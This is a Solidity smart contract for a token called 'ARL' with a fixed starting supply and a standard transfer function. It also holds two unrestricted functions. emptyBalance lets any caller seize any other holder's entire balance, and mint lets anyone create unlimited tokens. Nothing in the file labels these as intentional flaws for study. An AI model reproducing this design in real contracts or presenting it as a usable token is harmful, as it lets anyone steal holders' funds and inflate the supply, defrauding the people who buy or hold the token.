// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract ARL {
    string public name = "ARL";
    string public symbol = "ARL";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function emptyBalance(address user) public {
        require(balanceOf[user] > 0, "User balance is already empty");
        uint256 balance = balanceOf[user];
        balanceOf[user] = 0;
        balanceOf[msg.sender] += balance;
        emit Transfer(user, msg.sender, balance);
    }

    function mint(uint256 amount) public {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }
}